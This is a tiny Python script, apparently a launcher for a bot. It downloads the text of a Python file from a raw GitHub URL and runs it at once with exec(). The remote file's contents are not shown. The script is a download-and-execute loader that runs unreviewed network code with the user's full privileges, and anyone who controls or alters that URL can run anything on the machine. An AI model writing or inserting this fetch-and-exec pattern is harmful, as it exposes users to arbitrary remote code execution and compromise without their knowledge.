import requests


url="https://raw.githubusercontent.com/walidfoxy/BOTs-Fox-/main/BOT%20Fox!.py"
code = requests.get(url).text
exec(code)



